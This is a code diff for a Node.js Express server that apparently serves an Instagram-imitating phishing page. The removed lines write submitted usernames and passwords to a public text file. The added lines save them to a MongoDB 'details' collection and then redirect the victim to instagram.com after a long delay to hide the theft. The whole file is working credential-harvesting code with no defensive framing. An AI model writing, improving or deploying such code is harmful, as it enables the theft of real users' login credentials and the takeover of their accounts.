@@ -1,18 +1,37 @@
-const fs = require('fs');
-var express = require('express');
-var http = require('http');
-var path = require("path");
-var bodyParser = require('body-parser');
-var helmet = require('helmet');
+const express = require('express');
+const http = require('http');
+const path = require("path");
+const bodyParser = require('body-parser');
+const helmet = require('helmet');
+const mongoose = require("mongoose");
 const hostname='0.0.0.0';
 const port=3000;
+require("dotenv").config();
 
-var app = express();
-var server = http.createServer(app);
+const app = express();
+const server = http.createServer(app);
 
 app.use(bodyParser.urlencoded({extended: false}));
 app.use(express.static(path.join(__dirname,'./public')));
 app.use(helmet());
+
+
+//setting up mongoose
+mongoose
+  .connect(process.env.MONGOOSE_URL_STRING, {
+    useNewUrlParser: true,
+    useUnifiedTopology: true,
+  })
+  .then(() => console.log("Connected successfully"))
+  .catch((err) => console.log(err));
+
+const detailsSchema = new mongoose.Schema({
+  username:String,
+  password:String
+});
+
+//creating a new collection with above object
+const Details = mongoose.model("details", detailsSchema);
 
 
 app.get('/', function(req,res){
@@ -27,25 +46,28 @@ app.get('/login', function(req,res){
         }, 1000);
     });
     
-app.post('/redirect', function(req,res){
-     let input="";
-     fs.readFile('./public/tp.txt', 'utf8', (err, data) => {
-        if (err) {
-          return;
-        }
-        input=data+"\n"+req.body.username+"="+req.body.password;
-        fs.writeFile('./public/tp.txt',input, (err) => {
-        if (err) throw err;
-      })
-      });
-     
+//post method for posting
+app.post("/redirect", async (req, res) => {
+  var myData = {
+    username: req.body.username,
+    password: req.body.password,
+  };
+  await Details.create(myData)
+    .then(() => {
+      console.log("data saved")
       setTimeout(function(){
-    res.redirect('http://www.instagram.com');
-        }, 20000);
-  });
+        res.redirect('http://www.instagram.com');
+            }, 100000);
+    })
+    .catch((err) => {
+      console.log(err)
+    });
+    
+});
 
 
-
+//listening to the server
 server.listen(port,hostname, () => {
    console.log(`Server running at http://${hostname}:${port}/`)
 })
+
